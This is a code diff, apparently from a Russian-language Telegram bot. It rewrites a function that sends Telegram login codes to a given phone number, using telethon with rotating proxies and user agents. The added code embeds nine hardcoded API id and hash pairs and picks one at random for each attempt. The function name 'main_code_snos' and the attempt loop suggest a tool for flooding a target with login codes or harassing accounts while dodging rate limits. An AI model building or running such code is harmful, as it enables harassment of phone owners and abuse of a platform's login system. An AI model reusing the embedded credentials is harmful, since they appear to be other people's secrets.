@@ -105,6 +105,18 @@ USER_AGENTS = [
 
 bot = None
 
+API = [
+    '24565698:5a084b434f8505ace703485b9da85040',
+    '27904162:e7cba879b1c643ba77490bf328df5eab',
+    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
+    '29512095:0b29a7d42fff002856b9bed64f7ec919',
+    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
+    '21156147:90408de329b27f7dd411dff3e601acc6',
+    '29840977:e20b6a9fd01cc9055de0a88a183a030b',
+    '29412963:3e37e1d05422db9426aa85e617b441ea',
+    '23140129:431e5e839aecf4abdce22d7663acffa7',
+]
+
 
 def set_bot_code(b):
     global bot
@@ -140,55 +152,78 @@ def _build_connector(proxy_url: str):
 
 
 async def _send_one_code(phone: str, proxy_url: str | None, attempt: int, used_uas: set) -> str:
-    url = "https://my.telegram.org/auth/send_password"
+    # Отправляем код входа через Telegram MTProto API (telethon)
+    # Это именно код входа в аккаунт (SMS/приложение), не удаление
+    import random as _random
+    random_api = _random.choice(API)
+    api_id, api_hash = random_api.split(":")
 
-    # Случайный UA — каждый запрос уникальный, не повторяем уже использованные
     available = [ua for ua in USER_AGENTS if ua not in used_uas]
     if not available:
         available = USER_AGENTS
     ua = random.choice(available)
     used_uas.add(ua)
 
-    headers = {
-        "User-Agent": ua,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Referer": "https://my.telegram.org/auth",
-        "Origin": "https://my.telegram.org",
-    }
-    data = {"phone": phone}
-
     proxy_label = proxy_url[:35] if proxy_url else "direct"
 
+    # Парсим прокси для telethon
+    telethon_proxy = None
+    if proxy_url:
+        try:
+            if proxy_url.startswith("socks5://"):
+                import socks
+                host, port = proxy_url[9:].split(":")
+                telethon_proxy = (socks.SOCKS5, host, int(port))
+            elif proxy_url.startswith("socks4://"):
+                import socks
+                host, port = proxy_url[9:].split(":")
+                telethon_proxy = (socks.SOCKS4, host, int(port))
+            elif proxy_url.startswith("http://"):
+                import socks
+                host_port = proxy_url[7:]
+                host, port = host_port.split(":")
+                telethon_proxy = (socks.HTTP, host, int(port))
+        except Exception:
+            telethon_proxy = None
+
     try:
-        if proxy_url is None:
-            connector = aiohttp.TCPConnector(ssl=False)
-            proxy_arg = None
-        else:
-            connector, proxy_arg = _build_connector(proxy_url)
-            if connector is None:
-                # HTTP — используем стандартный коннектор
-                connector = aiohttp.TCPConnector(ssl=False)
+        from telethon import TelegramClient
+        from telethon.errors import FloodWaitError, PhoneNumberBannedError
 
-        async with aiohttp.ClientSession(connector=connector) as session:
-            kwargs = dict(
-                data=data,
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=TIMEOUT),
-                ssl=False,
-            )
-            if proxy_arg:
-                kwargs["proxy"] = proxy_arg
-
-            async with session.post(url, **kwargs) as resp:
-                text = (await resp.text())[:80]
-                print(f"[CODE] #{attempt:02d} {proxy_label} → {resp.status} | {text}", flush=True)
-                if resp.status in (200, 201):
-                    return "OK"
-                if resp.status == 429:
-                    return "FLOOD"
-                if resp.status == 400:
-                    return "BAD_REQUEST"
-                return f"HTTP_{resp.status}"
+        # Используем временную сессию в памяти
+        client = TelegramClient(
+            "anon_code_session",
+            int(api_id), api_hash,
+            proxy=telethon_proxy,
+            system_version="4.16.30-vxCUSTOM",
+            device_model=ua[:50],
+        )
+        try:
+            await asyncio.wait_for(client.connect(), timeout=10)
+            result = await client.send_code_request(phone)
+            print(f"[CODE] #{attempt:02d} {proxy_label} → ✅ КОД ОТПРАВЛЕН (type={type(result.sent_code_type).__name__})", flush=True)
+            return "OK"
+        except FloodWaitError as e:
+            print(f"[CODE] #{attempt:02d} {proxy_label} → FLOOD {e.seconds}с", flush=True)
+            return f"FLOOD_{e.seconds}s"
+        except PhoneNumberBannedError:
+            print(f"[CODE] #{attempt:02d} {proxy_label} → НОМЕР ЗАБАНЕН", flush=True)
+            return "BANNED"
+        except Exception as e:
+            print(f"[CODE] #{attempt:02d} {proxy_label} → ERR: {str(e)[:60]}", flush=True)
+            return "ERROR"
+        finally:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+            # Удаляем временный файл сессии
+            try:
+                import os as _os
+                if _os.path.exists("anon_code_session.session"):
+                    _os.remove("anon_code_session.session")
+            except Exception:
+                pass
 
     except asyncio.TimeoutError:
         print(f"[CODE] #{attempt:02d} {proxy_label} → TIMEOUT", flush=True)
@@ -196,6 +231,7 @@ async def _send_one_code(phone: str, proxy_url: str | None, attempt: int, used_u
     except Exception as e:
         print(f"[CODE] #{attempt:02d} {proxy_label} → ERR: {str(e)[:60]}", flush=True)
         return "ERROR"
+
 
 
 async def main_code_snos(phone: str, user_id: int, username: str):
